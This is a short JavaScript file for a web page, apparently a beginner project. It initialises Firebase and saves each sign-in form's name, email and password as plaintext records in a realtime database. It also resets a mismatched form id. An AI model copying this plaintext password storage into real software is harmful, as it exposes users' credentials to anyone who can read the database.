 // Your web app's Firebase configuration
  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
  var firebaseConfig = {
    apiKey: "AIzaSyCIEkXhzR8LlE0pqlOHPb4SZ6STerlJn84",
    authDomain: "gamebase-b0ad9.firebaseapp.com",
    projectId: "gamebase-b0ad9",
    storageBucket: "gamebase-b0ad9.appspot.com",
    messagingSenderId: "530278145556",
    appId: "1:530278145556:web:cb163452c40801b24a5101",
    measurementId: "G-E6ZJ7JRETB"
  };
  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);

  // references messages collection
 var messagesRef = firebase.database().ref('messages');

//listen to form submit
document.getElementById('Signin').addEventListener('submit', submitform);

function submitform(e){
    e.preventDefault();

   
  var name = getInputVal('name')
  var email = getInputVal('email')
  var password = getInputVal('password')

  savemessage(name, email, password);
// Show alert
document.querySelector('.alert').style.display = 'block';

// Hide alert after 3 seconds
setTimeout(function(){
  document.querySelector('.alert').style.display = 'none';
},3000);

// Clear form
document.getElementById('contactForm').reset();
}
    

//function get input form values
function getInputVal(id){
    return document.getElementById(id).value;

}

//save messages to firebase
function savemessage(name, email, password){
    var newmessagesRef = messagesRef.push();
    newmessagesRef.set({
        name: name,
        email: email,
        password: password

    }).then(function(){console.log('success')}).catch(function(error){console.log('error',error)});
}

function f1(){window.location.assign("mainpage.html")}